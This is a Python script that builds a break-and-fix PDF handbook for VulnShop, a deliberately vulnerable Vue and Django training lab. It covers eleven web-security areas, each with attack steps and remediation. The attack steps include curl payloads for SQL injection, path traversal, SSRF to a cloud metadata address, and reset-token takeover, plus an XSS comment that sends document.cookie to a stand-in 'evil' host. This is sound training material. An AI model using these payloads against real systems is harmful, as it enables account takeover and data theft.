"""
Generate docs/Break_and_Fix_Guide.pdf.

A break-and-fix handbook for the VulnShop training lab. For each of the 11
test areas it gives: what the weakness is, how to break it from the frontend,
how to break it on the backend, and how to fix it on both sides.

Run:  python make_pdf.py
"""
import os

from reportlab.lib import colors
from reportlab.lib.enums import TA_LEFT
from reportlab.lib.pagesizes import A4
from reportlab.lib.styles import ParagraphStyle, getSampleStyleSheet
from reportlab.lib.units import mm
from reportlab.platypus import (
    HRFlowable, ListFlowable, ListItem, PageBreak, Paragraph,
    SimpleDocTemplate, Spacer, Table, TableStyle,
)

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "docs", "Break_and_Fix_Guide.pdf")

# ---- palette ----------------------------------------------------------------
INK = colors.HexColor("#1a1d27")
ACC = colors.HexColor("#2b5fb3")
BAD = colors.HexColor("#b3261e")
OKC = colors.HexColor("#1b7a3d")
MUT = colors.HexColor("#5b6472")
CODEBG = colors.HexColor("#f2f3f7")
LINE = colors.HexColor("#d7dae2")

styles = getSampleStyleSheet()


def ps(name, **kw):
    base = kw.pop("parent", styles["Normal"])
    return ParagraphStyle(name, parent=base, **kw)


H1 = ps("H1", parent=styles["Heading1"], fontSize=17, textColor=ACC, spaceBefore=6, spaceAfter=6)
H2 = ps("H2", parent=styles["Heading2"], fontSize=13, textColor=INK, spaceBefore=10, spaceAfter=4)
SUB = ps("SUB", fontSize=10.5, textColor=MUT, leading=14)
BODY = ps("BODY", fontSize=10, leading=14.5, textColor=INK, alignment=TA_LEFT, spaceAfter=4)
LBL_BAD = ps("LBLBAD", fontSize=9.5, textColor=BAD, leading=13, spaceBefore=2)
LBL_OK = ps("LBLOK", fontSize=9.5, textColor=OKC, leading=13, spaceBefore=2)
CODE = ps("CODE", fontName="Courier", fontSize=8.6, leading=11.5, textColor=INK,
          backColor=CODEBG, borderPadding=(6, 6, 6, 6), spaceBefore=3, spaceAfter=6)
TAG = ps("TAG", fontName="Courier", fontSize=8, textColor=MUT)
TITLE = ps("TITLE", parent=styles["Title"], fontSize=26, textColor=INK, spaceAfter=4)


def esc(t):
    return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


def code(txt):
    return Paragraph(esc(txt).replace("\n", "<br/>"), CODE)


def bullets(items, style=BODY):
    return ListFlowable(
        [ListItem(Paragraph(x, style), leftIndent=6, value="•") for x in items],
        bulletType="bullet", start="•", leftIndent=14, spaceBefore=2, spaceAfter=4,
    )


def rule():
    return HRFlowable(width="100%", thickness=0.6, color=LINE, spaceBefore=6, spaceAfter=6)


story = []

# ---- cover ------------------------------------------------------------------
story += [
    Spacer(1, 40 * mm),
    Paragraph("VulnShop", TITLE),
    Paragraph("Break &amp; Fix Guide — a deliberately vulnerable Vue + Django lab", H2),
    Spacer(1, 6),
    Paragraph(
        "A hands-on handbook for 11 web-security test areas. For each area: what "
        "the weakness is, how to break it from the Vue frontend, how to break it "
        "against the Django backend, and how to fix it on both sides.", SUB),
    Spacer(1, 10 * mm),
    Paragraph(
        "<b>Authorised, local use only.</b> Every flaw here is intentional and "
        "self-contained, in the tradition of DVWA, OWASP Juice Shop and WebGoat. "
        "Run it only on your own machine/isolated network and test only this app. "
        "Do not deploy it anywhere reachable by others, and never point these "
        "techniques at systems you do not own or lack written permission to test.",
        ps("WARN", parent=BODY, backColor=colors.HexColor("#fdf0ef"),
           borderColor=BAD, borderWidth=0.8, borderPadding=8, textColor=INK)),
    Spacer(1, 8 * mm),
    Paragraph("Demo logins: alice / 123456 · bob / password · admin / admin", TAG),
    Paragraph("Backend: http://127.0.0.1:8000 · Frontend: http://127.0.0.1:5173", TAG),
    PageBreak(),
]

# ---- how to use -------------------------------------------------------------
story += [
    Paragraph("How to use this guide", H1),
    rule(),
    Paragraph(
        "Start the backend and frontend (see README). Work one area at a time: "
        "reproduce the break, confirm the impact, then apply the fix and re-test "
        "that the exploit now fails while normal use still works. Each code marker "
        "like <font face='Courier'>[VULN-04-SQLI]</font> appears next to the "
        "matching vulnerable code so you can jump straight to it.", BODY),
    Paragraph(
        "“Break (frontend)” means acting through the Vue UI or browser DevTools; "
        "“Break (backend)” means hitting the API directly (curl / an intercepting "
        "proxy). “Fix” lists the concrete change on each side.", SUB),
    Spacer(1, 4),
]

# ---- data: the 11 areas -----------------------------------------------------
AREAS = [
    {
        "n": "1", "title": "Authentication", "tag": "[VULN-01-AUTH]",
        "what": "Passwords are stored with MD5, there is no password policy, no "
                "brute-force protection, and the password-reset token is "
                "predictable, never expires, is reusable, and is handed straight "
                "back in the HTTP response.",
        "fe": ["Register with password <b>123456</b> — it is accepted (no policy).",
               "Click “Request reset token” for any username; the token "
               "<font face='Courier'>&lt;id&gt;reset</font> is shown in the response.",
               "Paste it into the reset box with a new password — it works, and "
               "it still works a second time."],
        "fe_code": None,
        "be": ["Guess another user's token and take over the account:"],
        "be_code": "curl -s -X POST localhost:8000/api/reset-password \\\n"
                   "  -H 'Content-Type: application/json' \\\n"
                   "  -d '{\"token\":\"1reset\",\"new_password\":\"pwned\"}'\n"
                   "# alice (user id 1) is now owned; token can be replayed",
        "fix": ["<b>Backend:</b> keep Django's default Argon2/PBKDF2 hashers "
                "(remove the MD5 <font face='Courier'>PASSWORD_HASHERS</font>); "
                "restore <font face='Courier'>AUTH_PASSWORD_VALIDATORS</font>; "
                "generate reset tokens with "
                "<font face='Courier'>secrets.token_urlsafe(32)</font>, store only "
                "their hash, set a short expiry, mark single-use "
                "(<font face='Courier'>used=True</font>) in a transaction, and "
                "<i>email</i> them instead of returning them; add rate-limiting / "
                "lockout and generic error messages.",
                "<b>Frontend:</b> never display or log reset tokens; enforce a "
                "password strength meter; show the same message whether or not the "
                "account exists."],
    },
    {
        "n": "2", "title": "Access control (IDOR)", "tag": "[VULN-02-ACCESS]",
        "what": "Order endpoints look up records by id with no ownership check, so "
                "any user can read or delete another user's orders.",
        "fe": ["Log in as alice, open the <i>Access control</i> card, change the "
               "order id from 1 to 2 and press GET — you see bob's order.",
               "Press DELETE to destroy an order you do not own."],
        "fe_code": None,
        "be": ["Enumerate every order with no session at all:"],
        "be_code": "for i in 1 2 3 4 5; do curl -s localhost:8000/api/orders/$i; echo; done",
        "fix": ["<b>Backend:</b> scope every lookup to the current principal — "
                "<font face='Courier'>Order.objects.get(id=order_id, "
                "owner=request.user)</font> — and return 404 on mismatch; require "
                "authentication; check an explicit permission for admin access; "
                "prefer unguessable ids (UUIDs) as defence in depth.",
                "<b>Frontend:</b> do not rely on hiding ids in the UI for "
                "security — but still avoid exposing raw sequential ids and handle "
                "403/404 gracefully."],
    },
    {
        "n": "3", "title": "Session management", "tag": "[VULN-03-SESSION]",
        "what": "“Logout” never calls Django's logout(), so the server-side "
                "session stays valid; cookies are long-lived, not Secure, and have "
                "no SameSite restriction.",
        "fe": ["Log in, then click logout. Click <i>GET /whoami</i> (or any "
               "authenticated call) again — you are still logged in server-side."],
        "fe_code": None,
        "be": ["Capture the sessionid cookie, hit logout, then reuse the same "
               "cookie — it still authenticates:"],
        "be_code": "curl -s -X POST localhost:8000/api/logout -b 'sessionid=<old>'\n"
                   "curl -s localhost:8000/api/whoami -b 'sessionid=<old>'  # still valid",
        "fix": ["<b>Backend:</b> call <font face='Courier'>logout(request)</font> "
                "(or <font face='Courier'>request.session.flush()</font>) to "
                "destroy the server session; set "
                "<font face='Courier'>SESSION_COOKIE_SECURE=True</font>, "
                "<font face='Courier'>SESSION_COOKIE_SAMESITE='Lax'</font>, a short "
                "<font face='Courier'>SESSION_COOKIE_AGE</font>, and rotate the "
                "session key on login to prevent fixation.",
                "<b>Frontend:</b> clear any client state on logout and redirect to "
                "a logged-out view; never store the session token in "
                "localStorage."],
    },
    {
        "n": "4", "title": "SQL injection", "tag": "[VULN-04-SQLI]",
        "what": "The order search builds a raw SQL string by concatenating the "
                "<font face='Courier'>q</font> parameter, and even echoes the "
                "executed SQL and DB errors back to the client.",
        "fe": ["In the <i>SQL injection</i> card, search for "
               "<font face='Courier'>%' OR 1=1 -- </font> to return every order "
               "regardless of the filter."],
        "fe_code": None,
        "be": ["Confirm the injection and read the reflected query/error:"],
        "be_code": "curl -s \"localhost:8000/api/search?q=%25'%20OR%201=1%20--%20\"\n"
                   "# UNION/boolean/time-based payloads extend this to dump tables",
        "fix": ["<b>Backend:</b> never build SQL by string concatenation. Use the "
                "ORM (<font face='Courier'>Order.objects.filter(item__icontains="
                "q)</font>) or parameterised raw SQL "
                "(<font face='Courier'>cursor.execute(sql, [param])</font>); grant "
                "the DB user least privilege; return generic errors and log "
                "details server-side only.",
                "<b>Frontend:</b> validate/limit input length and type for UX, but "
                "treat the server as the real trust boundary — client checks are "
                "not a defence against SQLi."],
    },
    {
        "n": "5", "title": "Cross-site scripting (XSS)", "tag": "[VULN-05-XSS]",
        "what": "Comments are stored verbatim and rendered with Vue's "
                "<font face='Courier'>v-html</font> (stored XSS); the greet "
                "endpoint reflects the <font face='Courier'>name</font> param into "
                "an HTML response that the page injects via v-html (reflected XSS).",
        "fe": ["In <i>Stored XSS</i>, post a comment body of "
               "<font face='Courier'>&lt;img src=x onerror=alert(document.cookie)&gt;"
               "</font>. It fires for every visitor who loads the comments.",
               "In <i>Reflected XSS</i>, enter "
               "<font face='Courier'>&lt;img src=x onerror=alert(1)&gt;</font> and "
               "fetch the greeting."],
        "fe_code": "<!-- the vulnerable render in frontend/index.html -->\n"
                   "<div v-html=\"c.body\"></div>",
        "be": ["Prove it is stored server-side (any client that renders it is "
               "affected):"],
        "be_code": "curl -s -X POST localhost:8000/api/comments \\\n"
                   "  -H 'Content-Type: application/json' \\\n"
                   "  -d '{\"author\":\"x\",\"body\":\"<script>fetch(\\'//evil/?c=\\'+document.cookie)</script>\"}'",
        "fix": ["<b>Frontend:</b> render user content as text — use "
                "<font face='Courier'>{{ c.body }}</font> (Vue escapes it), not "
                "<font face='Courier'>v-html</font>. If HTML really must be shown, "
                "sanitise with DOMPurify first.",
                "<b>Backend:</b> sanitise on input with an allow-list (e.g. the "
                "<font face='Courier'>bleach</font>/nh3 library), escape on output, "
                "set the correct <font face='Courier'>Content-Type</font> (JSON, "
                "not HTML), mark cookies <font face='Courier'>HttpOnly</font>, and "
                "send a strict <font face='Courier'>Content-Security-Policy</font> "
                "that forbids inline script."],
    },
    {
        "n": "6", "title": "Cross-site request forgery (CSRF)", "tag": "[VULN-06-CSRF]",
        "what": "CsrfViewMiddleware is disabled and the email-change view is "
                "<font face='Courier'>csrf_exempt</font>; combined with wide-open "
                "CORS and cookie auth, any site can perform actions as the "
                "logged-in victim.",
        "fe": ["Log into VulnShop, then open "
               "<font face='Courier'>docs/csrf-poc.html</font> in the same browser. "
               "It silently changes your email with no token."],
        "fe_code": None,
        "be": ["The forged request is just a cross-origin POST carrying the "
               "victim's cookie:"],
        "be_code": "curl -s -X POST localhost:8000/api/change-email \\\n"
                   "  -H 'Content-Type: application/json' \\\n"
                   "  -b 'sessionid=<victim>' -d '{\"email\":\"attacker@evil\"}'",
        "fix": ["<b>Backend:</b> re-enable "
                "<font face='Courier'>CsrfViewMiddleware</font>, remove "
                "<font face='Courier'>csrf_exempt</font>, require the CSRF token on "
                "all state-changing requests, set "
                "<font face='Courier'>SESSION_COOKIE_SAMESITE='Lax'</font>, replace "
                "wildcard CORS with a strict allow-list, and re-authenticate for "
                "sensitive changes.",
                "<b>Frontend:</b> read Django's "
                "<font face='Courier'>csrftoken</font> cookie and send it in the "
                "<font face='Courier'>X-CSRFToken</font> header on every mutating "
                "request."],
    },
    {
        "n": "7", "title": "File uploads & path traversal", "tag": "[VULN-07-FILES]",
        "what": "Uploads accept any type/size and keep the client-supplied "
                "filename; downloads join a user-supplied path to the media folder "
                "with no containment check.",
        "fe": ["Upload a <font face='Courier'>.html</font> or "
               "<font face='Courier'>.svg</font> file containing script — it is "
               "stored and served, giving stored XSS from the file host.",
               "In the download box enter <font face='Courier'>../db.sqlite3</font> "
               "to pull the database."],
        "fe_code": None,
        "be": ["Read arbitrary server files via traversal:"],
        "be_code": "curl -s 'localhost:8000/api/download?path=../db.sqlite3' -o loot.sqlite3\n"
                   "curl -s 'localhost:8000/api/download?path=../vulnproject/settings.py'",
        "fix": ["<b>Backend:</b> validate content type and size; generate a random "
                "server-side filename; store outside the web root; before serving, "
                "resolve the path and verify it stays inside the intended dir "
                "(<font face='Courier'>os.path.realpath(full).startswith(realpath("
                "MEDIA_ROOT))</font>) or serve only allow-listed ids; send "
                "downloads with <font face='Courier'>Content-Disposition: "
                "attachment</font> and "
                "<font face='Courier'>X-Content-Type-Options: nosniff</font>.",
                "<b>Frontend:</b> restrict the file picker "
                "(<font face='Courier'>accept=</font>), show type/size limits, and "
                "never build download URLs from raw user paths."],
    },
    {
        "n": "8", "title": "Server-side request forgery (SSRF)", "tag": "[VULN-08-SSRF]",
        "what": "“Import from URL” fetches any URL the client supplies — including "
                "localhost, cloud metadata endpoints and file:// — with no scheme "
                "or host restrictions and following redirects.",
        "fe": ["In the <i>SSRF</i> card, import "
               "<font face='Courier'>http://127.0.0.1:8000/api/debug</font> to read "
               "an internal-only endpoint via the server."],
        "fe_code": None,
        "be": ["Reach internal services / cloud metadata the attacker cannot "
               "touch directly:"],
        "be_code": "curl -s -X POST localhost:8000/api/import-url \\\n"
                   "  -H 'Content-Type: application/json' \\\n"
                   "  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/\"}'",
        "fix": ["<b>Backend:</b> allow-list permitted schemes (https only) and "
                "hosts; resolve DNS yourself and reject private, loopback and "
                "link-local ranges (incl. the resolved IP after any redirect); "
                "disable redirects; set tight timeouts and a response size cap; "
                "make the fetch from an egress-restricted network segment.",
                "<b>Frontend:</b> offer a fixed list of allowed sources rather "
                "than a free-text URL where possible."],
    },
    {
        "n": "9", "title": "Business logic", "tag": "[VULN-09-LOGIC]",
        "what": "Checkout trusts the client-supplied price and quantity, allows "
                "negative quantities, and applies coupons that are never marked "
                "redeemed (so they are infinitely reusable).",
        "fe": ["In <i>Checkout</i>, set price_cents to 1 (or a negative quantity), "
               "apply <font face='Courier'>SAVE50</font> repeatedly, and submit — "
               "the order is created as paid at your price."],
        "fe_code": None,
        "be": ["Buy for a penny and stack the coupon:"],
        "be_code": "curl -s -X POST localhost:8000/api/checkout \\\n"
                   "  -H 'Content-Type: application/json' \\\n"
                   "  -d '{\"item\":\"Red Gadget\",\"price_cents\":1,\"quantity\":1,\"coupon\":\"SAVE50\"}'",
        "fix": ["<b>Backend:</b> compute every monetary value server-side from the "
                "authoritative catalogue; ignore client prices; validate ranges "
                "(quantity &gt; 0, within stock); enforce coupon rules "
                "transactionally (<font face='Courier'>select_for_update</font>, "
                "mark redeemed, check per-user limits); verify payment before "
                "marking paid.",
                "<b>Frontend:</b> treat displayed totals as a preview only; never "
                "send prices the server will trust."],
    },
    {
        "n": "10", "title": "API security (excessive data exposure)", "tag": "[VULN-10-API]",
        "what": "The users endpoint needs no auth and returns sensitive fields the "
                "UI hides: email, password hash, SSN, internal notes and an admin "
                "flag.",
        "fe": ["Click <i>GET /users</i>; the list on screen shows only usernames, "
               "but expand the raw JSON to see every hidden field."],
        "fe_code": None,
        "be": ["Pull the sensitive fields directly — the client never filters "
               "them, the server over-shares:"],
        "be_code": "curl -s localhost:8000/api/users | python -m json.tool\n"
                   "# password_hash, ssn, internal_notes, is_admin all present",
        "fix": ["<b>Backend:</b> require authentication and authorisation; "
                "serialise an explicit allow-list of public fields (never "
                "<font face='Courier'>password</font>/PII); use serializers/DTOs "
                "rather than dumping model dicts; apply object- and field-level "
                "permissions; paginate.",
                "<b>Frontend:</b> remember that hiding a field in the UI does not "
                "protect it — the fix must be server-side."],
    },
    {
        "n": "11", "title": "Configuration & encryption", "tag": "[VULN-11-CONFIG]",
        "what": "DEBUG is on, SECRET_KEY is hard-coded, ALLOWED_HOSTS is wildcard, "
                "CORS reflects any origin with credentials, security headers are "
                "off, and a /debug endpoint dumps settings and environment.",
        "fe": ["Click <i>GET /debug</i> to read the secret key and settings; note "
               "the app is plain HTTP with no security headers."],
        "fe_code": None,
        "be": ["Harvest secrets and trigger a verbose error page:"],
        "be_code": "curl -s localhost:8000/api/debug           # SECRET_KEY, paths, env\n"
                   "curl -s 'localhost:8000/api/search?q=%27'  # DEBUG stack trace + SQL",
        "fix": ["<b>Backend:</b> set <font face='Courier'>DEBUG=False</font>; load "
                "<font face='Courier'>SECRET_KEY</font> from the environment and "
                "rotate it; pin <font face='Courier'>ALLOWED_HOSTS</font>; remove "
                "the debug endpoint and any backup files; enable "
                "<font face='Courier'>SECURE_SSL_REDIRECT</font>, HSTS, "
                "<font face='Courier'>X_FRAME_OPTIONS='DENY'</font>, "
                "<font face='Courier'>SECURE_CONTENT_TYPE_NOSNIFF</font>, Secure "
                "cookies and a CSP; replace wildcard CORS with a strict "
                "allow-list (django-cors-headers).",
                "<b>Frontend:</b> serve over HTTPS, keep API base URLs in config "
                "(not secrets), and never embed credentials or tokens in the "
                "bundle."],
    },
]


def area_block(a):
    blk = [
        Paragraph(f"{a['n']}. {a['title']}", H1),
        Paragraph(a["tag"], TAG),
        rule(),
        Paragraph("<b>What's wrong.</b> " + a["what"], BODY),
        Paragraph("Break it — frontend", LBL_BAD),
    ]
    blk.append(bullets(a["fe"]))
    if a["fe_code"]:
        blk.append(code(a["fe_code"]))
    blk.append(Paragraph("Break it — backend", LBL_BAD))
    blk.append(bullets(a["be"]))
    if a["be_code"]:
        blk.append(code(a["be_code"]))
    blk.append(Paragraph("Fix it", LBL_OK))
    blk.append(bullets(a["fix"]))
    blk.append(Spacer(1, 2))
    return blk


for i, a in enumerate(AREAS):
    story.append(PageBreak())
    story += area_block(a)

# ---- checklist page ---------------------------------------------------------
story.append(PageBreak())
story.append(Paragraph("Quick remediation checklist", H1))
story.append(rule())
rows = [["#", "Area", "Single most important fix"]]
oneliners = [
    "Strong hasher + password policy + expiring, single-use, emailed reset tokens.",
    "Scope every record lookup to the authenticated owner; 404 on mismatch.",
    "Call logout()/session.flush(); Secure + SameSite + short-lived cookies.",
    "Parameterised queries / ORM; never concatenate SQL; generic errors.",
    "Escape output ({{ }}), drop v-html / sanitise; HttpOnly cookies + CSP.",
    "Re-enable CSRF middleware + token; SameSite cookies; strict CORS.",
    "Validate type/size, random names, contained paths, attachment downloads.",
    "Allow-list schemes/hosts; block private IPs; no redirects; timeouts.",
    "Compute price/totals server-side; validate ranges; single-use coupons.",
    "Auth + field allow-list serialisers; never return PII / hashes.",
    "DEBUG=False, secrets from env, headers + HSTS + CSP, remove debug routes.",
]
for a, one in zip(AREAS, oneliners):
    rows.append([a["n"], a["title"], one])

tbl = Table(rows, colWidths=[10 * mm, 42 * mm, 108 * mm])
tbl.setStyle(TableStyle([
    ("BACKGROUND", (0, 0), (-1, 0), ACC),
    ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
    ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
    ("FONTSIZE", (0, 0), (-1, -1), 8.6),
    ("VALIGN", (0, 0), (-1, -1), "TOP"),
    ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#f5f6fa")]),
    ("GRID", (0, 0), (-1, -1), 0.4, LINE),
    ("TOPPADDING", (0, 0), (-1, -1), 5),
    ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
    ("LEFTPADDING", (0, 0), (-1, -1), 6),
]))
story.append(tbl)
story.append(Spacer(1, 8))
story.append(Paragraph(
    "Golden rules: never trust the client; validate and encode at the trust "
    "boundary; enforce authentication and authorisation on every request; fail "
    "closed; and keep secrets and debug surfaces out of production.", SUB))


def footer(canvas, doc):
    canvas.saveState()
    canvas.setFont("Helvetica", 7.5)
    canvas.setFillColor(MUT)
    canvas.drawString(20 * mm, 12 * mm, "VulnShop — Break & Fix Guide · authorised training use only")
    canvas.drawRightString(A4[0] - 20 * mm, 12 * mm, f"p. {doc.page}")
    canvas.restoreState()


doc = SimpleDocTemplate(
    OUT, pagesize=A4,
    leftMargin=20 * mm, rightMargin=20 * mm,
    topMargin=18 * mm, bottomMargin=20 * mm,
    title="VulnShop Break & Fix Guide",
    author="VulnShop training lab",
)
doc.build(story, onFirstPage=footer, onLaterPages=footer)
print("wrote", OUT)
